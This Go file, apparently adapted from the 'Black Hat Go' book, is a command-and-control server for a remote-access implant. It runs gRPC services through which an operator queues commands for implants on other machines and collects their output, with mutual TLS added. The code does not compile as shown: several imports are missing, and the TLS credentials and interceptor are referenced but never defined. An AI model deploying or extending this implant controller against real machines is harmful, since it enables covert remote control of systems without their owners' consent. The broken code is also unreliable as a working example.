package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"

	"github.com/blackhat-go/bhg/ch-14/grpcapi"
	"google.golang.org/grpc"
)

func loadTLSCredentials() (credentials.TransportCredentials, error) {
    // Load certificate of the CA who signed client's certificate
    pemClientCA, err := ioutil.ReadFile("cert/ca-cert.pem")
    if err != nil {
        return nil, err
    }

    certPool := x509.NewCertPool()
    if !certPool.AppendCertsFromPEM(pemClientCA) {
        return nil, fmt.Errorf("failed to add client CA's certificate")
    }

    // Load server's certificate and private key
    serverCert, err := tls.LoadX509KeyPair("cert/server-cert.pem", "cert/server-key.pem")
    if err != nil {
        return nil, err
    }

    // Create the credentials and return it
    config := &tls.Config{
        Certificates: []tls.Certificate{serverCert},
        ClientAuth:   tls.RequireAndVerifyClientCert,
        ClientCAs:    certPool,
    }

    return credentials.NewTLS(config), nil
}


type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		// No work
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err)
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal(err)
	}
	grpcAdminServer, grpcImplantServer := grpc.NewServer(grpc.Creds(tlsCredentials),
        grpc.UnaryInterceptor(interceptor.Unary()),
        grpc.StreamInterceptor(interceptor.Stream())), grpc.NewServer(grpc.Creds(tlsCredentials),
        grpc.UnaryInterceptor(interceptor.Unary()),
        grpc.StreamInterceptor(interceptor.Stream()))
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
